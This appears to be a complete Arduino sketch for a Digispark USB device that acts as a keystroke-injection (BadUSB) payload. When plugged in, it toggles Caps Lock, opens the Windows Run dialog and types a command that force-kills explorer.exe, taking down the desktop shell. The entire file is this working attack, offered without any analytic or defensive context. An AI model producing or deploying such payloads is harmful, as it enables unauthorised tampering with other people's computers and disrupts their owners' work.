#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_CAPS_LOCK  57
#define KEY_PRT_SCR 70
#define KEY_DELETE  76

void setup() {

DigiKeyboard.sendKeyStroke(0); //clear
DigiKeyboard.delay(50);
DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK); //
DigiKeyboard.delay(50);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(250);
DigiKeyboard.println("taskkill -f -im explorer.exe");
DigiKeyboard.delay(50);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
void loop() {
}

